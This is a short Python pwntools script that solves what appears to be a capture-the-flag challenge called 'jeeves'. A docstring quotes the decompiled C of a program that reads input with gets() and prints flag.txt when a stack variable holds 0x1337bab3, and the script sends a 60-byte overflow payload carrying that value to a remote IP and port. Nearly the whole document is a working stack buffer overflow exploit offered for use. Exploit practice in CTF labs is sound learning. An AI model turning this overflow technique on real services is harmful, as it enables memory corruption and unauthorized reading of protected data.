from pwn import *
import pwn

'''
This is the function that we need to break
There's only a main

undefined8 main(void)

{
  char local_48 [44];
  int local_1c;
  void *local_18;
  int local_c;
  
  local_c = -0x21523f2d;
  printf("Hello, good sir!\nMay I have your name? ");
  gets(local_48);
  printf("Hello %s, hope you have a good day!\n",local_48);
  if (local_c == 0x1337bab3) {
    local_18 = malloc(0x100);
    local_1c = open("flag.txt",0);
    read(local_1c,local_18,0x100);
    printf("Pleased to make your acquaintance. Here\'s a small gift: %s\n",local_18);
    close(local_1c);
  }
  return 0;
}

We just need to overwrite the variable with 1337bab3. GG ez (May regret later lol)

gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL

So we have NX so no shellcode on stack. Kewl
'''

payload = b"A"*60+ b"\xb3\xba\x37\x13" #0x1337bab3
#print(payload)

#p = process("./jeeves")

p = remote('178.128.162.158',30885) #178.128.162.158 30885

#ip1 = p.recv()
#print(ip1)
p.sendline(payload)

ip2 = p.recv()
print(ip2)

#ip3 = p.recv()
#print(ip3)
#p.interactive()

